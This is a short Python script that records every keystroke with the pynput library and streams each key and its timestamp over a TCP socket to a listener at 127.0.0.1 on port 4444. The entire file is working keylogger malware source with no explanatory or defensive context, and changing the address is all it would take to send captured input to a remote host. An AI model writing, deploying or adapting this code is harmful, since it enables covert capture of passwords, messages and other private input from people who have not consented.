from pynput.keyboard import Key, Listener
import os
import time
import socket

mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mysock.connect(('127.0.0.1', 4444))


def on_press(key):
       r = '{}\t\t{}\n'.format(key, time.time())
       data = r.encode()
       mysock.send(data)  
    
with Listener(on_press=on_press) as listener:
    listener.join()    
